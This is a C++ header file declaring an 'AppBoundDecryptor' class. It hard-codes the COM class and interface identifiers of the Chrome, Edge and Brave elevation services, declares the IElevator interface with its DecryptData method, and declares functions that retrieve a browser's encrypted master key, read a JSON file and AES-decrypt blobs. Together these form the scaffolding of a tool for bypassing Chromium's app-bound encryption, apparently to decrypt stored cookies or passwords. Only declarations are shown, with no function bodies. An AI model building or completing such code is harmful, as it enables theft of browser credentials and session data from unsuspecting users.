#ifndef APPBOUNDDECRYPTOR_H
#define APPBOUNDDECRYPTOR_H

#include "Imports.h"

class AppBoundDecryptor {
private:
    DATA_BLOB* COM_master_key_blob;

    const CLSID CLSID_Elevator_Chrome = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
    const IID IID_IElevator_Chrome = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };

    //used brave-browser clsids and iids for edge and it decrypted key... Very Weird !!!
    //const CLSID CLSID_Elevator_Edge = { 0x576B31AF, 0x6369, 0x4B6B, { 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B } };
    //const IID IID_IElevator_Edge = { 0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9} };

    const CLSID CLSID_Elevator_Edge = { 0x1FCBE96C, 0x1697, 0x43AF, { 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67 } };
    const IID IID_IElevator_Edge = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };

    const CLSID CLSID_Elevator_Brave = { 0x576B31AF, 0x6369, 0x4B6B, { 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B } };
    const IID IID_IElevator_Brave = { 0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9} };

    typedef enum ProtectionLevel
    {
        PROTECTION_NONE = 0,
        PROTECTION_PATH_VALIDATION_OLD = 1,
        PROTECTION_PATH_VALIDATION = 2,
        PROTECTION_MAX = 3
    } ProtectionLevel;

    MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
        IElevator : public IUnknown
    {
    public:
        virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
            /* [string][in] */ const WCHAR * crx_path,
            /* [string][in] */ const WCHAR * browser_appid,
            /* [string][in] */ const WCHAR * browser_version,
            /* [string][in] */ const WCHAR * session_id,
            /* [in] */ DWORD caller_proc_id,
            /* [out] */ ULONG_PTR * proc_handle) = 0;

        virtual HRESULT STDMETHODCALLTYPE EncryptData(
            /* [in] */ ProtectionLevel protection_level,
            /* [in] */ const BSTR plaintext,
            /* [out] */ BSTR* ciphertext,
            /* [out] */ DWORD* last_error) = 0;

        // https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevator.cc#L155
        virtual HRESULT STDMETHODCALLTYPE DecryptData(
            /* [in] */ const BSTR ciphertext,
            /* [out] */ BSTR* plaintext,
            /* [out] */ DWORD* last_error) = 0;
    };

public:

    // Constructor
    AppBoundDecryptor();

    // Destructor (if needed)
    ~AppBoundDecryptor();

    // Member function to initialize ChromiumDecryptor
    BOOL RequestCOM(std::string service_parameter);
    std::vector<uint8_t> RetrieveEncryptedKey(std::string process, std::string service_parameter);
    std::string read_json(const std::string& filePath);
    BOOL AppBoundDecryptorInit(std::string path, std::string identifier);
    BOOL ConvertToBLOB(std::string hexString);
    std::string AESDecrypter(std::vector<BYTE> EncryptedBlob);

private:
    // Helper functions if needed
};

#endif /* APPBOUNDDECRYPTOR_H */#pragma once
